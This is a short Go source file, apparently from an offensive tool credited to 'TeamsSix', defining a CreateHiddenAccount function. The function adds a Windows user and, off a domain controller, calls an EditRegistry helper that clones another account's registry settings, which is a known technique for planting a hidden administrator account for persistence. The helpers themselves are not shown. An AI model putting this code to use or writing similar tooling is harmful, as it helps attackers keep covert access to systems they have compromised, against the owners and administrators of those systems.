// Author : TeamsSix
// Blog : teamssix.com
// WeChat Official Accounts: TeamsSix

package core

import (
	"../common"
)

func CreateHiddenAccount(username, password, cloneuser string, onlycreate bool) {
	if common.DetermineDC() {
		UserAdd(username, password)
	} else {
		if onlycreate {
			UserAdd(username, password)
		} else {
			UserAdd(username, password)
			EditRegistry(username, cloneuser)
		}
	}
}
